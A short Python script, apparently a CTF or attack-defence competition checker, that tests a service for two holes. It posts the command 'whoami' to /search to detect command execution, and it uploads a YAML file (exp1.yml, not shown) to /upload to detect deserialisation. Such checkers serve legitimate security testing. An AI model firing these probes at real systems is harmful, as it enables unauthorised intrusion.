#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2025-01-07 15:49
# @Author  : skilywen
import requests, os

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
}

def check_alive(url):
    is_alive = False
    is_404 = False
    try:
        res = requests.get(url, headers=headers, timeout=3)
        if res.status_code == 404:
            is_404 = True
        if res.status_code == 200 and '<html' in res.text:
            is_alive = True
    except:
        print('check service 请求失败')
    return [is_alive, is_404]


def check1(url):
    description = '第一处：/search  命令执行'
    is_vuln = False
    is_vuln_404 = False
    try:
        payload = {
            'search':'whoami'
        }
        res = requests.post(url + '/search', headers=headers, data=payload, timeout=3)
        if res.status_code == 404:
            is_vuln_404 = True
        if 'root' in res.text:
            is_vuln = True
    except:
        pass
    return [is_vuln, is_vuln_404, description]

def check2(url):
    description = '第二处：/upload  yaml反序列漏洞'
    is_404 = False
    is_vuln = False
    try:
        abs_path = os.path.abspath('.')
        data = {
            'file': open(f'{abs_path}/scripts/exp1.yml', 'rb')
        }
        r = requests.post(url + '/upload', files=data, timeout=5)
        if r.status_code == 404:
            is_404 = True
        elif '1' in r.text:
            is_vuln = True
    except Exception as e:
        print(e)
        pass
    return [is_vuln, is_404, description]

def check(url, point):
    return check_alive(url) + globals()['check' + point](url)